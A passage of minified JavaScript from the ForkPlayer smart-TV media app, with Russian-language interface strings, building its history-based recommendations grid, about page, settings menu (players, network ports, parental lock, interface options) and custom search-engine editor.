var deftop=l0OIIlIIlONuu1111Ypr(cached.start);if(deftop!=null){for(var i in deftop.channels){ctop.push(deftop.channels[i])}}
if(parseInt(maJor.params.get("third"))!=1){for(var i=0;i<ctop.length;i++)if(gV(ctop[i],"source")=="third"){ctop.splice(i,1);i--}}
var defgrid=[];var np=Math.ceil(4*(ch.config.best/3));if(userGrid!=null){try{$.each(userGrid.stlast,function(ii,val){if(!is_xxx(val)&&defgrid.length<np){if(ch.hidetop&&ch.hidetop.submenu)return;if(gV(val,"play_url")!=""&&gV(val,"play_url")!=gV(val,"stream_url")){var el=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(val));var el2=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(val));el.display_title=el.title=gV(val,"parser")+val.stream_url;el.position="list";el2.display_title=el2.title=el2.stream_url=el2.play_url;el2.parser="";el2.position="list";if(typeof val.menu!="object")val.menu=[];var tch={"title":val.title,"logo_30x30":val.logo_30x30,"playlist_url":"submenu","submenu":[el,el2]}}else tch=val;tch.menu=[val.menu[0],{"title":val.time+" ago","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=grid&type=stlast"}];defgrid.push(tch)}});var ex="";$.each(userGrid.pllast,function(ii,val){if(!is_xxx(val.ch)&&defgrid.length<2*np){if(ch.hidetop&&ch.hidetop[val.ch.playlist_url])return;val.ch.menu=[{"title":val.time+" ago","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=grid&type=pllast"}];defgrid.push(val.ch);ex+=val.ch.playlist_url+"..."}});$.each(userGrid.pltop,function(ii,val){if(!is_xxx(val.ch)&&defgrid.length<5*np&&ex.indexOf(val.ch.playlist_url+"...")==-1){if(ch.hidetop&&ch.hidetop[val.ch.playlist_url])return;val.ch.menu=[{"title":val.time+" "+val.c+"times","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=grid&type=pltop"}];defgrid.push(val.ch)}})}catch(e){kjtYpr.popUp("Error user grid "+e.message,1500)}}
ctop=delDupl(ch.fav,ctop);ctop=delDupl(defgrid,ctop);var ctop2=[];for(var i=0;i<defgrid.length;i++){ctop2.push(defgrid[i])}
for(var i=0;i<ctop.length;i++){if(ch.hidetop&&ch.hidetop[gV(ctop[i],"playlist_url")+gV(ctop[i],"stream_url")])continue;else ctop2.push(ctop[i])}
ctop=ctop2;for(var i=0;i<ctop.length;i++)if(i>=ch.config.best*9){ctop.splice(i,1);i--}
return ctop}
function getVars(n,pq){if(n.indexOf("about:info")==0){var data={"align":"left","title":"<b>Контакты и Условия использования</b>","channels":[{"title":"Назад","playlist_url":"cmd:historyback(-2);","position":"hlink"}]};data.before="<div style='margin: 20px auto;width: 90%;background: #586367;padding: 10px; border-radius: 5px;font-size:80%;'>"+"Перед вами кроссплатформенное приложение  для создания настраиваемых мультимедийных страниц (состоящих из видео, аудиофайлов, изображений, текстов и ссылок). Он не содержит никакого контента и представляет собой так называемое приложение White Label. Вы можете создать свой собственный контент или открывать существующий и общий контент от других людей. Весь контент написан в формате JSON (JavaScript Object Notation), XML или M3U с простой и удобной структурой. Созданные файлы страниц могут размещаться на любом HTTP-сервере, поддерживающем CORS (Cross-Origin Resource Sharing).<br>"+"Особенности:<br>"+"- Создавайте простые или сложные медиа-страницы как в исходном коде так и с помощью готовых cистем управления содержимым (CMS).<br>"+"- Легко перемещайтесь по этим страницам мультимедиа с помощью пульта дистанционного управления или указателя.<br>"+"- Воспроизведение нескольких видео / аудио файлов в списке воспроизведения.<br>"+"- Показать несколько изображений в слайд-шоу.<br>"+"- Во время просмотра видео или прослушивания аудиофайла одновременно просматривайте другие страницы мультимедиа (видео / аудиофайл продолжает работать в фоновом режиме).<br>"+"- Открывать ссылки в полноэкранном режиме.<br>"+"Это приложение не несет ответственности за Контент созданный сторонними авторами не выступает в их поддержку.<br>"+"<span style='color:yellow;'>Сообщества поддержки приложения:<br>"+"https://t.me/forkplayertv (7 тыс. участников)<br>https://t.me/ForkPlayer (1 тыс. участников)<br>https://t.me/Pro_ForkPlayer (8 сот. участников)<br>https://t.me/fork_player (2 сот. участников)<br>"+"VK: https://vk.com/smarttv_ru<br></span>"+"</div>"}else if(n.indexOf("about:yoursearchEngines")==0){var data={"title":"_FPNaitiVglobPoiske_"};data["chan"+"nels"]=[];if(IlO11lQ0().history.length>1){var ttl=nmlz(IlO11lQ0().history[IlO11lQ0().history.length-1].title).split(" ");var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}}
var title=n.split("yoursearchEngines|")[1];ttl=nmlz(title.replace(/\s+/g," ")).split(" ");if(title.indexOf("<div")==0){ttl=title.match(/nowrap;'>(.*?)</)[1].replace(/("|'|т\/c|х\/ф|,|Т\/с|Х\/ф)/ig," ").replace(/\s+/g," ").split(" ")}
var s="";for(var i=0;i<ttl.length;i++){if(ttl[i]==" "||ttl[i]=="")continue;s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}
var ort=ttl.join(" ");if(ort.indexOf("Сезон")>=0){var mtc=ort.match(/сезон.*?- (.*)/i);if(mtc!=null){s=mtc[1];data["chan"+"nels"].unshift({"logo_30x30":_img("_ST_search.png"),"title":s,"playlist_url":"searchEngines|"+s})}}
return data}else if(n.indexOf("about:settings")==0){var se=getVars("getconfig");var c=n.replace(/^.*?#/,"").replace(/\?.*$/,"");if(c){var d=c.split(":");if(d[0]=="setconfig"){if(d[1]=="defstart"){delete se.config;delete se.fav;delete se.hidetop;userTop={};maJor.write("datas","");setVars("start",se);se=getVars("start");kjtYpr.inf("OK!",1300)}else if(d[1]=="clearhide"){delete se.hidetop;setVars("start",se);kjtYpr.inf("OK!",1300)}else if(d[1]=="cleartop"){maJor.write("datas","");userTop={};kjtYpr.inf("OK!",1300)}else if(d[1]=="order"){if(exinobj(se.config.order,d[2])){$.each(se.config.order,function(ii,val){if(d[2]==val)se.config.order.splice(ii,1)})}else{var x=0;for(var i in startL){if(startL[i]==d[2])break;if(exinobj(se.config.order,startL[i]))x++}
se.config.order.splice(x,0,d[2])}
setVars("start",se)}else{if(d[2]==1||d[2]==0)d[2]=parseInt(d[2]);se.config[d[1]]=d[2];setVars("start",se)}
if(gP().lII1I1PVBuI1lIlYpr=="about:blank"){IlO11lQ0().reload();return}}else if(d[0]=="reset"){confirmed.create("_FPSbrositNastr_ _FPprilozheniya_?<br>_FPVsaeZaklUd_!? ").fun0=function(){sbrosok()};return}else{if(d.length>3){var d=[d[0],d[1],d.splice(2).join(":")]}
if(d[2]=="manual"&&d[1]!="player"&&d[1]!="streamplayer"){d[2]=pq.inputed.text;if(d[1].match(/^(torrserve|acestream|remoteip)/)){if(d[2].indexOf(".")==-1||d[2].indexOf(":")==-1)return{"cmd":"stop();","notify":(pq.elCh.error||"Error format!")}}
if(d[1].match(/^(udp)/)){if(!d[2].match(/^https?:\/\/./))return{"cmd":"stop();","notify":"Error! Enter http url of UDP server"}}
if(d[1].match(/^(remote)/)){if(d[2].indexOf(".")==-1)return{"cmd":"stop();","notify":"Error! Enter IP example 192.168.0.1"}}
VK.close(1)}
maJor.params.set(d[1],d[2]);if(d[1]=="ver")kjtYpr.inf("_FPRestart the app to change the version now_",1300);if(d[1]=="remoteip")maJor.params.set("remote",3);if(d[1].match(/(remote|torrserve|acestream)/))maJor.Remote.init();if(d[1].match(/(pr|sidebar|color|font|fon)/))FXMLPage.ll00IOO11EVII1IYpr();if(d[1].match(/zoom/))FXMLPage.setZoom(1)}
handler="menu"}
if(maJor.virtual)var vtt="<img align=right height=12 style='margin: 1px 0px 0px 2px;' src='"+_img("_ST_untrust.png")+"' title='Информация об идентификаторе берется с памяти и может меняться, например при сбросе тв к заводским или обновлении ПО' >";else vtt="<img align=right height=12 style='margin: 1px 0px 0px 2px;' src='"+_img("_ST_trust.png")+"' title='Информация об идентификаторе берется с характеристик ТВ (мак адрес или androidid), менятся может при смене типа подключения' >";ch=[];var m=[];for(var i in _lang)m.push({"title":i+" "+_lang[i]._name,"playlist_url":"about:settings#set:lang:"+i});if(!_lang[maJor.params.get('lang')])maJor.params.set('lang',"ru");ch.push({"title":"Language","description":maJor.params.get('lang')+" "+_lang[maJor.params.get('lang')]._name,"logo_30x30":_img("_ST_settings/language.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"title":"","description":"_FPSet name_","search_on":"search_on","value":maJor.params.get('name'),"playlist_url":"about:settings#set:name:manual","logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html"});m=[];for(var i=-11;i<=11;i++){var t=new Date(T.inetTime+i*3600000);var dstring=to(t.getHours(),t.getMinutes());m.push({"title":dstring,"playlist_url":"about:settings#set:JTVRegion:"+i})}
ch.push({"title":"_FPTime offset_","description":((maJor.params.get('JTVRegion')>0)?"+"+maJor.params.get('JTVRegion'):maJor.params.get('JTVRegion')),"logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"_FPStartovoeMenu_","playlist_url":"about:settings#set:recovery:0"},{"title":"_FPPrRabStogoMesta_","playlist_url":"about:settings#set:recovery:1"}];ch.push({"title":"_FPNachGrupa_","description":((maJor.params.get('recovery')=="true"||maJor.params.get('recovery')===!0||maJor.params.get('recovery')==1)?"_FPPrRabStogoMesta_":"_FPStartovoeMenu_"),"logo_30x30":_img("_ST_settings/start.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(maJor.user)m=[{"title":shint(30)+" & User sync","playlist_url":"about:settings#set:ts:0"},{"title":shint(29),"playlist_url":"about:settings#set:ts:-1"},{"title":shint(31),"playlist_url":"about:settings#set:ts:1"}];else m=[{"title":shint(30),"playlist_url":"about:settings#set:ts:0"},{"title":shint(31),"playlist_url":"about:settings#set:ts:1"}];ch.push({"title":"_FPStore data_","description":shint(30+maJor.params.get('ts')),"logo_30x30":_img("_ST_settings/save.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:adult:0"},{"title":shint(1),"playlist_url":"about:settings#set:adult:1"}];ch.push({"br":1,"title":"_FPAdult content_","description":shint(maJor.params.get("adult")),"logo_30x30":_img("_ST_settings/padlock.png"),"is_parent_lock":1,"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:passwordkey:"},{"title":"_FPVvedNov_ _FPParol_","search_on":"search_on","type":"password","playlist_url":"about:settings#set:passwordkey:manual"}];ch.push({"is_parent_lock":1,"title":"_FPRodKontr_","description":shint(maJor.params.get('passwordkey'),"p"),"logo_30x30":_img("_ST_settings/padlock.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"Fork _FPkeyboard_","playlist_url":"about:settings#set:keyboard:"},{"title":"_FPsystem_","playlist_url":"about:settings#set:keyboard:system"}];ch.push({"title":"_FPl0IlI0I10LMNlOI1IYpr_","description":(maJor.params.get('keyboard')?"_FP"+maJor.params.get('keyboard')+"_":"Fork _FPkeyboard_"),"logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":librarys.versions().old+" Устаревшая! Не рекомендуется","playlist_url":"about:settings#set:ver:2101"},{"title":librarys.versions().stable+" _FPLatest stable_","playlist_url":"about:settings#set:ver:"},{"title":librarys.versions().beta+" _FPLatest beta_ ","playlist_url":"about:settings#set:ver:beta"}];ch.push({"title":"Fork version","description":maJor.params.get('ver'),"logo_30x30":_img("_ST_settings/time.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"after":"<div style='text-align:left;font-size:110%;margin:3px;'>_FPStart Page_</div>","title":"_FPAdjust weather_","logo_30x30":_img("_ST_settings/wat.png"),"template":tmpl_box,"position":"html","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=weather&id=set"});var br=1;for(var i in startL){var def=exinobj(se.config.order,startL[i]);ch.push({"br":br,"title":startN[startL[i]],"template":tmpl_box,"position":"html","logo_30x30":"http://check"+(def?"true":"false"),"description":"","playlist_url":"about:settings#setconfig:order:"+startL[i]+":"+(def?"0":"1")});br=0}
ch.push({"br":1,"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPYour search engines_","playlist_url":"about:configsearch"});m=[];for(var i=0;i<=5;i++)m.push({"title":i+" строк","playlist_url":"about:settings#setconfig:best:"+i});ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPRecommendation_","description":"<span style='font-weight:bold;border:1px solid gray;padding:0px 3px;'>"+se.config.best+" _FProws_  &#9660; </span><br>_FPHistory based recommendations_","playlist_url":"menu","menu":m});ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPClear recommendation_","description":"_FPLength history_ "+maJor.read("datas").length+"bytes","playlist_url":"about:settings#setconfig:cleartop"});if(typeof se.hidetop=="object"){var dop=0;for(var i in se.hidetop)dop++;ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"Восстановить скрытые рекоммендации","description":"Скрытые URL: "+dop,"playlist_url":"about:settings#setconfig:clearhide"})}
m=[{"title":"_FPRecommendation_","playlist_url":"about:settings#setconfig:besttop:1"},{"title":"_FPFavorites_","playlist_url":"about:settings#setconfig:besttop:0"}];ch.push({"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_label.png"),"title":"_FPSetDefaultStartMenu_","description":"","playlist_url":"confirm","confirm":["about:settings#setconfig:defstart"]});m=[];maJor.each(maJor.getPlayer().v,function(i){m.push({"title":i.title,"playlist_url":"about:settings#set:player:"+i.name})});ch.push({"br":1,"before":"<div style='text-align:left;font-size:110%;margin:3px;'>_FPVideo & Audio_</div>","logo_30x30":_img("_ST_settings/video.png"),"title":"_FPVideopleer_","description":maJor.getPlayer().player.title,"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];maJor.each(maJor.getPlayer().s,function(i){m.push({"title":i.title,"playlist_url":"about:settings#set:streamplayer:"+i.name})});ch.push({"title":"IPTV+HLS _FPpleer_","description":maJor.getPlayer().streamplayer.title,"template":tmpl_box,"position":"html","logo_30x30":_img("_ST_settings/video-player1.png"),"playlist_url":"menu","menu":m});m=[];for(var i in sQual)m.push({"title":sQual[i]+"p","playlist_url":"about:settings#set:quality:"+i});ch.push({"title":"_FPKachVideo_","description":sQual[maJor.params.get('quality')]+"p","logo_30x30":_img("_ST_settings/1080.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(maJor.platform().match(/maple|mag|dune/))var maxr=1;else if(maJor.platform().match(/lg/))maxr=4;else maxr=3;m=[];for(var i=0;i<maxr;i++)m.push({"title":shint(i,"a"),"playlist_url":"about:settings#set:audioplayer:"+i});ch.push({"title":"_FPAudioMini_ _FPpleer_","description":shint(maJor.params.get('audioplayer'),"a"),"logo_30x30":_img("_ST_settings/audio.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(20),"playlist_url":"about:settings#set:pip:0"},{"title":shint(21),"playlist_url":"about:settings#set:pip:1"},{"title":shint(22),"playlist_url":"about:settings#set:pip:2"},{"title":shint(13),"playlist_url":"about:settings#set:pip:3"}];ch.push({"title":"PIP","description":shint(20+parseInt(maJor.params.get('pip'))),"logo_30x30":_img("_ST_settings/pip.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in sNext)m.push({"title":sNext[i],"playlist_url":"about:settings#set:next:"+i});ch.push({"br":1,"title":"_FPRezhim_ повтора","description":sNext[maJor.params.get('next')],"logo_30x30":_img("_ST_settings/playlist.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(10),"playlist_url":"about:settings#set:sortiptv:0"},{"title":shint(11),"playlist_url":"about:settings#set:sortiptv:1"},{"title":shint(12),"playlist_url":"about:settings#set:sortiptv:2"},{"title":shint(13),"playlist_url":"about:settings#set:sortiptv:3"}];ch.push({"title":"_FPSortirovka_ IPTV","description":shint(10+parseInt(maJor.params.get('sortiptv'))),"logo_30x30":_img("_ST_settings/sort.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:headers:0"},{"title":shint(1),"playlist_url":"about:settings#set:headers:1"}];ch.push({"br":1,"before":"<div style='text-align:left;font-size:110%;margin:3px;'>_FPNetwork_</div>","title":"_FPSend_ _FPheaders_","description":shint(maJor.params.get('headers')),"logo_30x30":_img("_ST_settings/send.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(50),"playlist_url":"about:settings#set:serv:"}];var x=0;for(var i in uHelper.rCurl){if(maJor.timestamp>2)m.push({"title":"cURL "+(x+1),"playlist_url":"about:settings#set:serv:"+x});x++}
m.push({"title":"_FPOtkl._","playlist_url":"about:settings#set:serv:-1"});function stser(a){if(a==-1)var x="_FPOtkl._";else if(a=="")x="_FPAuto_";else x="cURL "+(++a);return x}
ch.push({"title":"CORS page proxy","description":stser(maJor.params.get("serv")),"logo_30x30":_img("_ST_settings/script.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(!maJor.params.get("remoteip"))var ds="_FPEnter_ IP:PORT";else ds="_FPManually_ "+maJor.params.get("remoteip");m=[{"title":shint(0),"playlist_url":"about:settings#set:remote:0"},{"title":shint(2),"playlist_url":"about:settings#set:remote:2"},{"title":"This device 127.0.0.1:8027","playlist_url":"about:settings#set:remoteip:127.0.0.1:8027"},{"title":ds,"search_on":"_FPEnter_ IP:PORT","search_title":"Порт RemoteFork PC версии :8027, Андроид :8028","value":maJor.params.get("remoteip"),"filter":"answer","error":"Error! Enter IP:PORT example 127.0.0.1:8027","playlist_url":"about:settings#set:remoteip:manual"}];ch.push({"title":"LOCAL_IP Remote&DLNA","description":shint(maJor.params.get('remote')),"logo_30x30":_img("_ST_settings/ip.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:torrserve:0"},{"title":"This device 127.0.0.1:8090","playlist_url":"about:settings#set:torrserve:127.0.0.1:8090"},{"value":maJor.params.get("torrserve"),"filter":"answer","error":"Error! Enter IP:PORT example 127.0.0.1:8090","title":"_FPEnter_ IP:PORT "+shint(maJor.params.get('torrserve')),"search_on":"search_on","playlist_url":"about:settings#set:torrserve:manual"}];ch.push({"title":"TORRSERVE_IP","description":shint(maJor.params.get('torrserve')),"logo_30x30":_img("_ST_settings/torser.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:acestream:0"},{"title":"This device 127.0.0.1","playlist_url":"about:settings#set:acestream:127.0.0.1:6878"},{"title":"_FPEnter_ IP:PORT "+shint(maJor.params.get('acestream')),"filter":"answer","error":"Error! Enter IP:PORT example 127.0.0.1:6878","value":maJor.params.get("acestream"),"search_on":"search_on","playlist_url":"about:settings#set:acestream:manual"}];ch.push({"title":"ACE_IP Ace Stream","description":shint(maJor.params.get('acestream')),"value":maJor.params.get("acestream"),"logo_30x30":_img("_ST_settings/ace_stream.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:udp:0"},{"title":"_FPEnter_ IP:PORT "+shint(maJor.params.get('udp')),"search_on":"search_on","value":maJor.params.get('udp'),"filter":"answer","playlist_url":"about:settings#set:udp:manual"}];ch.push({"br":1,"title":"_FPUDP-to-HTTP Proxy_","description":shint(maJor.params.get('udp')),"search_on":"IP:PORT UDP-to-HTTP Proxy","logo_30x30":_img("_ST_settings/ip.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i=75;i<=250;i++)if(i%25==0)m.push({"title":i+"%","playlist_url":"about:settings#set:zoom:"+i});ch.push({"br":1,"before":"<div style='text-align:left;font-size:110%;margin:3px;'>_FPInterface Setup_</div>","title":"_FPZoom_","description":maJor.params.get('zoom')+"%","logo_30x30":_img("_ST_settings/list.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:sidebar:0"},{"title":shint(1),"playlist_url":"about:settings#set:sidebar:1"}];ch.push({"title":"_FPBookmark toolbar_","description":shint(parseInt(maJor.params.get("sidebar"))),"logo_30x30":_img("_ST_settings/bookmark.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];m.push({"title":"_FPOtkl._","playlist_url":"about:settings#set:pr:0"});for(var i=10;i<=100;i+=10)m.push({"title":i+"%","playlist_url":"about:settings#set:pr:"+i});ch.push({"title":"_FPTransparency in the interface_","description":maJor.params.get('pr')+"%","logo_30x30":_img("_ST_settings/opacity.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0,7),"playlist_url":"about:settings#set:scrsaver:0"},{"title":shint(1,7),"playlist_url":"about:settings#set:scrsaver:1"}];ch.push({"title":"_FPScreensaver_","description":shint(maJor.params.get('scrsaver'),7),"logo_30x30":_img("_ST_settings/screensaver.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:rate:0"},{"title":shint(1),"playlist_url":"about:settings#set:rate:1"}];ch.push({"title":"_FPShow rating_","description":shint(parseInt(maJor.params.get("rate"))),"logo_30x30":_img("_ST_settings/review.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in f_font)m.push({"title":"<span style='font-family:"+f_font[i]+"'> "+f_font[i]+"</span> ","playlist_url":"about:settings#set:font:"+f_font[i]});ch.push({"br":1,"title":"_FPFont_","description":maJor.params.get('font'),"logo_30x30":_img("_ST_settings/font.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in maJor.f_cols)m.push({"title":"<span style='color:"+maJor.f_cols[i]+"'> "+maJor.f_cols[i]+"</span> ","playlist_url":"about:settings#set:color:"+maJor.f_cols[i]});ch.push({"title":"_FPCvetText_","description":" Color "+(maJor.params.get('color')),"logo_30x30":_img("_ST_settings/color-selection.png"),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"_FPVibrat_...","playlist_url":"https://raw.githubusercontent.com/komivp/appinfodl/main/static/fon/index.php"},{"title":"_FPDefault_","playlist_url":"about:settings#set:fon:"},{"title":"_FPForced without a background_","playlist_url":"about:settings#set:fon:-1"}];ch.push({"title":"_FPFonRisunok_","description":"","logo_30x30":(getFon(maJor.params.get('fon'))||"data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs="),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"br":1,"before":"<div style='text-align:center;'>","after":"</div>","title":"_FPPolnSbrosNastr_","logo_30x30":"none","template":""+tmpl_button+"","position":"html","playlist_url":"about:settings#reset"});data={"align":"left","css":".description{visibility: hidden;}","icon":"none","typeList":"start","title":"_FPSettings_","before":"<div style='float:right;color:gray;margin-right:15px;font-size:50%;'> "+gV(maJor.loader_platform)+" "+gV(window,"is_ver")+" "+maJor.platform()+" "+maJor.screen().w+"x"+maJor.screen().h+" Cors: "+(maJor.app_cors||"No")+" "+(maJor.build?"Android build: "+maJor.build+" sdk "+kjtYpr.sdk:"")+" User ID: "+(!maJor.user?"Нет.":maJor.user.email)+" Device ID: "+vtt+maJor.getId()+"</div><div style='text-align:left;font-size:110%;margin:3px;'>_FPSettings_</div><div style='font-size:90%;'>","after":"</div>","channels":ch};if(n.indexOf("#")>0){gP().channels=ch;gP().renderChannels(getSelect(),"update");return}}else if(n.indexOf("about:configsearch")==0){var x=n.split("#");IlO11lQ0().loadPage.lII1I1PVBuI1lIlYpr=x[0];var data={"navigate":"_FPNastrGlPoisk_","typeList":"start"};if(x.length==2){var se=getVars("start");var ds=-1;for(var i=0;i<se.search.sites.length;i++){if(se.search.sites[i].dop==2)ds=i}
x=x[1].split(":");if(x[0]=="move"){if(se.search[x[1]].length>1){var x1=x[3];if(x[2]=="up"){if(x[3]==0)var x2=se.search[x[1]].length-1;else x2=x1-1}else if(x[2]=="down"){if(x[3]==se.search[x[1]].length-1)var x2=0;else x2=1+1*x1}
if(x[3]==se.search.ds)se.search.ds=x2;else if(x2==se.search.ds)se.search.ds=x[3];oldselect=x2;var tmp=se.search[x[1]][x1];se.search[x[1]][x1]=se.search[x[1]][x2];se.search[x[1]][x2]=tmp}else kjtYpr.inf("Ошибка перемещения! Только один элемент в списке "+x[1],1500)}else if(x[0]=="setDop"){if(x[3]==2&&ds>=0)se.search.sites[ds].dop=1;se.search.sites[x[2]].dop=1*x[3]}else if(x[0]=="delsites"){se.search.sites.splice(parseInt(x[1]),1)}else if(x[0]=="save"){var wr=0;var p="sites";if(gV(pq.input,"egsurl")=="")kjtYpr.inf("Ссылка не может быть пустой!",1800);else if(!gV(pq.input,"egsurl").match(/%s/))kjtYpr.inf("Ссылка должна содержать параметр запроса %s!",1800);else if(!gV(pq.input,"egsurl").match(/^(https?|html):\/\//))kjtYpr.inf("Ссылка должна начинаться с http://, html:// или https:// !",1800);else{if(x[2]=="new"){x[2]=se.search[p].length;se.search[p].push({})}
se.search[p][x[2]].url=gV(pq.input,"egsurl");if(gV(pq.input,"egstitle")=="New search"){var m=gV(pq.input,"egsurl").match(/\/\/(.*?)\//);if(m!=null)pq.input.egstitle=m[1]}
se.search[p][x[2]].title=gV(pq.input,"egstitle");se.search[p][x[2]].logo=gV(pq.input,"egslogo");if(gV(pq.input,"egsenabled")==2&&ds>=0)se.search.sites[ds].dop=1;se.search[p][x[2]].dop=1*gV(pq.input,"egsenabled");se.search[p][x[2]].type="";kjtYpr.inf("Установлен URL "+pq.input.egsurl,1500);wr=1}
if(!wr)return}else if(x[0]=="edit"){IlO11lQ0().loadPage.lII1I1PVBuI1lIlYpr=n;var ttl="Редактировать";if(gV(x,2)=="new"){ttl="Добавить";if(typeof pq.elCh["new"]=="object")var t=pq.elCh["new"];else t={"title":"New search","logo":"","url":""};var enabled=1;var dop="включено дополнительно"}else{t=se.search.sites[x[2]];if(se.search.ds==x[2]||se.search.sites[x[2]].dop==2){enabled=2;dop="<span style='color:green;font-weight:bold;'>включено по умолчанию </span>"}else if(se.search.sites[x[2]].dop){enabled=1;dop="включено дополнительно"}else{enabled=0;dop="<span style='color:red;'>отключено</span>"}}
var mn=[{"title":"Включить по умолчанию","playlist_url":"payd_egsenabled","value":"2"},{"title":"Включить дополнительно","playlist_url":"payd_egsenabled","value":"1"},{"title":"Отключить ","playlist_url":"payd_egsenabled","value":"0"}];var cX=0,cY=0;var data={"align":"left","all_after":"<div style='margin:5px;clear: both;'></div>","all_template":'<div style="text-align:left;width:900px;height:25px; font-size: 24px;word-break: break-all;  margin: 4px; border-radius: 5px;     padding: 5px 16px 6px 6px;    color: #111;    background: rgb(232, 240, 254);">$title</div>',"navigate":"_FPNastrGlPoisk_","typeList":"start","before":"<div style='text-align:left;margin:3px 20px;'><b>"+ttl+" поисковую систему</b></div>","title":t.title,"navigate":"Редатирование "+t.title,"channels":[{"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>Название</div>","title":""+t.title,"playlist_url":"payd_egstitle","value":t.title,"search_on":"Название","position":"html"},{"br":1,"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>Иконка<div style='text-align:left;font-size: 17px;'> необязательно</div></div>","title":""+t.logo,"logo_30x30":t.logo,"playlist_url":"payd_egslogo","value":t.logo,"search_on":"Иконка (необязательно)","position":"html"},{"br":1,"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>URL<div style='text-align:left;font-size: 17px;'>должен быть c параметром %s вместо запроса</div></div>","title":""+t.url,"presearch":"http://omnibox.spiderxml.com/?type=historysearch","description":tmpl_info.replace("info","Укажите URL c параметром %s вместо запроса"),"playlist_url":"payd_egsurl","value":t.url,"search_on":"URL c параметром %s вместо запроса","position":"html"},{"br":1,"before":"<div style='margin-left: 30px;text-align: left;font-size: 30px;float: left;width: 300px;'>_FPUse in search_</div>","title":dop,"value":enabled,"template":"<div style='font-size: 24px;margin: 4px;    border-radius: 5px;    padding: 5px;    color: #111;    background: rgb(232, 240, 254);'>$title &#9660;</div>","position":"html","playlist_url":"payd_egsenabled","menu":mn},{"br":1,"before":"<span style='margin:30px 10px 0px 450px;'></span>","after":" ","title":"_FPSave_","template":tmpl_button,"playlist_url":"about:configsearch#save:sites:"+x[2],"logo_30x30":"","position":"html"},{"br":0,"before":"<span style='margin:30px;'></span>","after":" ","playlist_url":"confirm","confirm":["about:configsearch"],"title":(gV(x,2)=="new"?"_FPYour search engines_":"_FPCancel_"),"description":"_FPOpen_ _FPYour search engines_?","template":tmpl_button,"logo_30x30":"","position":"html"}]};if(gV(x,2)!="new"){data.channels.push({"br":0,"before":"<span style='margin:30px;'></span>","playlist_url":"confirm","confirm":["about:configsearch#delsites:"+x[2]],"title":"_FPDelete_","description":"_FPDelete_?","template":tmpl_button,"logo_30x30":"","position":"html"})}
return data}else if(x[0]=="setdefault"){delete se.search;setVars("start",se);se=getVars("start")}
